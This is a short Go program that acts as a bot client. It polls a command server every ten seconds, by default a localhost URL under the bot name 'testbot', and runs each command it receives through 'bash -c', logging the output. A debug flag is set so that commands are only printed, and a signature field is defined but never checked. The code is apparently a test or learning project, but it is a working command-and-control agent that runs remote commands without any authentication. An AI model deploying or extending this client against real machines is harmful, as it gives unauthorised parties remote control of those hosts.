package main

import (
	"bytes"
	"encoding/json"
	"io/ioutil"
	"log"
	"net/http"
	"os/exec"
	"time"
)

type Command struct {
	Id string
	Cmd string
	Time int
	Signature string
	Once bool
}

var commander_url = "http://127.1:3000/command"
var bot_name = "testbot"
var spawnedShell = "bash"
var pollInterval uint32 = 10
var debug = true //commands are not executed, only printed

var executedIds []string

func pollCommand() (Command, error) {
	resp, err := http.Get(commander_url)
	if err != nil {
		return Command{}, err
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return Command{}, err
	}

	var command Command
	err = json.Unmarshal(body, &command)
	if err != nil {
		return Command{}, err
	}

	return command, nil
}

func shellexec(command string) (string, string, error) {
    var stdout bytes.Buffer
    var stderr bytes.Buffer
    cmd := exec.Command(spawnedShell, "-c", command)
    cmd.Stdout = &stdout
    cmd.Stderr = &stderr
    err := cmd.Run()
    return stdout.String(), stderr.String(), err
}

func listContains(s []string, e string) bool {
    for _, a := range s {
        if a == e {
            return true
        }
    }
    return false
}

func execute() error {
	command, err := pollCommand()
	if err != nil {
		log.Println(err)
		return err
	}

	if command.Id == "" {
		return nil
	}

	if command.Once {
		if listContains(executedIds, command.Id) {
			log.Printf("Command duplicate received. Skipping %s\n", command.Id)
			return nil
		}

		executedIds = append(executedIds, command.Id)
	}
	
	if debug {
		log.Printf("Command: %s\n", command.Cmd)
		return nil
	}

	stdout, stderr, err := shellexec(command.Cmd)
	log.Printf("Command: %s\n", command.Cmd)
	log.Printf("Stdout: %s\n", stdout)
	log.Printf("Stderr: %s\n", stderr)

	return nil
}

func main() {
	executedIds = make([]string, 0)
	log.Printf("Starting polling cycle... (%ds)\n", pollInterval)
	execute()
	for range time.Tick(time.Second * time.Duration(pollInterval)) {
        execute()
    }
}